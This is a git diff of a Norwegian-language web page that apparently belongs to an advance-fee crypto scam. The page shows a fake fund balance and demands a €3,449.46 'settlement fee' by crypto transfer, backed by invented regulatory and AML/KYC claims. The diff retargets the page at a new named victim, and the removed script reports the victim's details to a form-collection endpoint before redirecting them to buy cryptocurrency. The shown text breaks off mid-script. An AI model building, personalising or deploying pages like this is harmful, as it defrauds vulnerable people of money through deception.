@@ -160,7 +160,7 @@
                 </div>
                 <div class="data-item">
                     <span class="label">Pool navngitt etter</span>
-                    <span class="value">John Jonsonuk</span>
+                    <span class="value">Asbjørn Finholt</span>
                 </div>
                 <div class="data-item">
                     <span class="label">Verifiseringsstatus</span>
@@ -194,7 +194,7 @@
                     <h2 style="font-size: 2rem; color: var(--primary-blue);">€3 449,46</h2>
                 </div>
 
-                <p style="margin-bottom: 20px; font-size: 0.9rem;">For å fullføre frigjøringen av midler til <strong>John Jonsonuk</strong>, vennligst fortsett med oppgjøret via vår autoriserte sikre portal.</p>
+                <p style="margin-bottom: 20px; font-size: 0.9rem;">For å fullføre frigjøringen av midler til <strong>Asbjørn Finholt</strong>, vennligst fortsett med oppgjøret via vår autoriserte sikre portal.</p>
                 
                 <div class="notice-box" style="border-left-color: #f39c12;">
                     <p><strong>Betalingsmetode:</strong> Sikker kryptooverføring</p>
@@ -211,7 +211,7 @@
         <p class="compliance-text">
             Autorisert og regulert av relevante internasjonale tilsynsmyndigheter. 
             Alle transaksjoner er underlagt AML/KYC-verifisering.
-            <br>Verifiserings-ID: 8842-X99-JONSONUK
+            <br>Verifiserings-ID: 8842-X99-FINHOLT
         </p>
     </footer>
 
@@ -228,25 +228,5 @@
 
             const formData = new FormData();
             formData.append('Action', 'Betaling initiert');
-            formData.append('Kunde', 'John Jonsonuk');
-            formData.append('Saldo', '€24 639');
-            formData.append('Gebyr', '€3 449,46');
-            formData.append('Tidspunkt', new Date().toLocaleString('nb-NO'));
-
-            try {
-                await fetch('https://formspree.io/f/mqeovrgq', {
-                    method: 'POST',
-                    body: formData,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                });
-            } catch (error) {
-                console.error('Varslingsfeil:', error);
-            } finally {
-                window.location.href = "https://changelly.com/buy-crypto";
-            }
-        }
-    </script>
-</body>
-</html>
+            formData.append('Kunde', 'Asbjørn Finholt');
+            
